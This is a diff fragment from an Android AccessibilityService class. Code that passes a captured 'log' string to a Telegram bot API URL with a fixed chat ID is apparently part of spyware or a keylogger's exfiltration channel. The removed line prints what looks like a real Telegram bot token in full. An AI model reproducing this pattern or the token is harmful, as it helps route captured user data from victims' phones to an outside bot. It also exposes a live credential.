@@ -260,7 +260,7 @@ public class MyAccessibilityService extends AccessibilityService {
             String log = strings[0];
 
             try {
-                String botToken = "7207051466:AAGFZO7pfDDDOiwuGbsNIrU8cHrLmSM1E4A";
+                String botToken = BuildConfig.BOT_TOKEN;
                 String chatId = "1461889061";
                 String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
 
